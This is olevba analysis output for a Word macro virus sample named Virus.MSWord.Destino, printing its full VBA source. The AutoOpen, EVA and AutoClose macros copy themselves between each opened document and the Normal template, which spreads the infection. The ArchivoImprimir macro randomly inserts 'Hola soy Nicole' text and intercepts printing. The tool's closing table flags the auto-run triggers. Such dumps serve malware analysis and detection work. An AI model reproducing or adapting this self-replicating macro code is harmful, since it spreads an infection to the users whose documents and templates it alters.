olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Destino
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Destino - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Destino - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Cárdenas para PRESIDENTE"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.EVA.MAIN"

Dim ORIGEN As String
Dim DESTINO As String


'BUSCA EL ORIGEN
ORIGEN = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name

'BUSCA DESTINO
DESTINO = NormalTemplate.Path & Application.PathSeparator & NormalTemplate.Name
'ActiveDocument.Close SaveChanges:=True

On Error GoTo fin


WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="ArchivoImprimir", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="Autoclose", Tab:=3
WordBasic.Organizer Rename:=1, Source:=DESTINO, Name:="EVA", NewName:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3

fin:



'dlgAnswer = Dialogs(wdDialogFileOpen).Show

End Sub
-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimir.bas 
in file: Virus.MSWord.Destino - OLE stream: 'Macros/VBA/ArchivoImprimir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub HerramMacro()
'
' HerramMacro Macro
' Ejecuta, crea, elimina o revisa una macro
'
On Error GoTo NADA

NADA:
End Sub
Sub VerCódigoVB()
'
' erCódigo Macro
' Ver código del control seleccionado
'
On Error GoTo NADA
WordBasic.Insert "Hola soy Nicole, la mágica Nicole"
WordBasic.CharLeft 28, 1
WordBasic.Bold
WordBasic.FontSize 24
WordBasic.CenterPara
NADA:
End Sub
Sub ArchivoImprimir()
'
' IMPRIMIR Macro
' Macro grabada el 20/01/99 por
'
On Error GoTo NADA
 Dim valor As Integer
   valor = Int(100 * Rnd())

   If valor > 90 Then
   MsgBox "Hola soy Nicole, la mágica Nicole"
   End If
   
 Dim valor2 As Integer
   valor2 = Int(100 * Rnd())
   
   If valor2 > 90 Then
   Selection.TypeText Text:=" HOLA SOY NICOLE"
   End If
dlgAnswer = Dialogs(wdDialogFilePrint).Show
NADA:
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Destino - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Guarda el documento o la plantilla activa."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArchivoGuardar.MAIN"


Dim ORIGEN As String
Dim DESTINO As String


'BUSCA EL ORIGEN
DESTINO = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name

'BUSCA DESTINO
ORIGEN = NormalTemplate.Path & Application.PathSeparator & NormalTemplate.Name
'ActiveDocument.Close SaveChanges:=True

On Error GoTo fin


WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="ArchivoImprimir", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="Autoclose", Tab:=3
WordBasic.Organizer Rename:=1, Source:=DESTINO, Name:="EVA", NewName:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3

fin:


'dlgAnswer = Dialogs(wdDialogFileOpen).Show


End Sub
-------------------------------------------------------------------------------
VBA MACRO EVA.bas 
in file: Virus.MSWord.Destino - OLE stream: 'Macros/VBA/EVA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Cárdenas para PRESIDENTE"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.EVA.MAIN"

Dim ORIGEN As String
Dim DESTINO As String


'BUSCA EL ORIGEN
ORIGEN = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name

'BUSCA DESTINO
DESTINO = NormalTemplate.Path & Application.PathSeparator & NormalTemplate.Name
'ActiveDocument.Close SaveChanges:=True

On Error GoTo fin


WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="ArchivoImprimir", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="Autoclose", Tab:=3
WordBasic.Organizer Rename:=1, Source:=DESTINO, Name:="EVA", NewName:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=ORIGEN, Destination:=DESTINO, Name:="EVA", Tab:=3

fin:



'dlgAnswer = Dialogs(wdDialogFileOpen).Show

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

